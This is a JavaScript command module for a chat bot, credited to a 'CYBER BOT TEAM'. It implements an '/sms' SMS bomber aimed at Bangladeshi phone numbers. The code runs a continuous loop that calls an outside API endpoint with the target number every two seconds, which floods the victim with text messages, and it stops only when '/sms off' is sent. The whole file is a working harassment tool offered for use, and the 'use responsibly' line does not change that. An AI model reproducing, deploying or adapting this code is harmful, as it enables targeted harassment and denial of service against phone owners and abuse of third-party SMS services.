module.exports = {
  config: {
    name: "sms",
    version: "2.0.0",
    hasPermission: 0,
    credits: "—͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️",
    description: "Continuous SMS Bomber | Stop with /sms off",
    commandCategory: "Utility",
    usages: "/sms [01XXXXXXXXX] or /sms off",
    cooldowns: 0,
    dependencies: { 
      "axios": ""
    }
  },
  
  onStart: async function ({ api, event, args }) {
    const axios = require("axios");
    const threadID = event.threadID;
    const number = args[0];
    
    // Global bombing flags
    if (!global.bombingFlags) global.bombingFlags = {};
    
    // Stop command
    if (number === "off") {
      if (global.bombingFlags[threadID]) {
        global.bombingFlags[threadID] = false;
        return api.sendMessage("✅ SMS bombing stopped successfully!", threadID);
      }
      return api.sendMessage("❌ No active bombing in this thread!", threadID);
    }

    // Validate number
    if (!/^01[0-9]{9}$/.test(number)) {
      return api.sendMessage(
        `⚡ SMS BOMBER (GOAT Bot)\n\n` +
        `Usage:\n/sms 01XXXXXXXXX\n` +
        `(Bangladeshi numbers only - use responsibly)\n\n` +
        `Stop command: /sms off`,
        threadID
      );
    }

    // Check if already bombing
    if (global.bombingFlags[threadID]) {
      return api.sendMessage("⚠️ Bombing already active in this thread!\nStop with: /sms off", threadID);
    }

    // Start bombing
    api.sendMessage(`💣 SMS bombing STARTED for: ${number}\n\nType "/sms off" to stop`, threadID);
    global.bombingFlags[threadID] = true;

    // Bombing function
    const bomb = async () => {
      while (global.bombingFlags[threadID]) {
        try {
          await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
          await new Promise(resolve => setTimeout(resolve, 2000)); // 2 second delay
        } catch (error) {
          console.error("Bombing error:", error);
          global.bombingFlags[threadID] = false;
          api.sendMessage(`❌ Bombing failed!\nError: ${error.message}`, threadID);
          break;
        }
      }
    };

    bomb(); // Start the bombing loop
  }
};
